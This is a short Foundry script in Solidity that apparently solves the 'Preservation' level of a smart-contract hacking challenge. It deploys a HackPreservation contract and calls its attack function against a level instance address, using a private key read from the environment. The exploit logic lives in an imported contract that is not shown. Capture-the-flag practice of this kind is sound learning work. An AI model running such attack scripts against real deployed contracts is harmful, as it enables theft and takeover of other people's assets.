// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import { HackPreservation } from "../../contracts/solutions/HackPreservation.sol";

contract PreservationScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("ACCOUNT_PRIVATE_KEY");
        address levelInstanceAddress = vm.envAddress("CONTRACT_INSTANCE_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);

        HackPreservation hackPreservation = new HackPreservation();

        hackPreservation.attack(levelInstanceAddress);

        vm.stopBroadcast();

    }
}